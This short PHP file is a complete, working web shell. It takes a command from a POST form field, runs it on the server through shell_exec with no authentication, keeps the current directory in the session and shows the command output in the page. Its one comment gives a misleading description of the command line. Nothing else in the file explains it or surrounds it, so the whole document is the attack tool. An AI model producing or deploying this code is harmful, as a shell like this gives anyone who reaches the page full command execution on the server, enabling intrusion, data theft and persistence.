<?php
session_start();
$c = $_SESSION['c'] ?? getcwd();
if ($_POST['x']) {
    $p = trim($_POST['x']);
    if (preg_match('/^cd (.+)/', $p, $m)) {
        $d = realpath($c . '/' . $m[1]);
        if (is_dir($d)) $c = $d;
    } else {
        chdir($c);
        $o = shell_exec($p . ' 2>&1'); // fix output error command
    }
    $_SESSION['c'] = $c;
}
?>
<form method="post">
<?=htmlspecialchars($c)?><br>
<input name="x" value="<?=htmlspecialchars($_POST['x'] ?? '')?>">
<button>Run</button>
</form>
<pre><?=htmlspecialchars($o ?? '')?></pre>
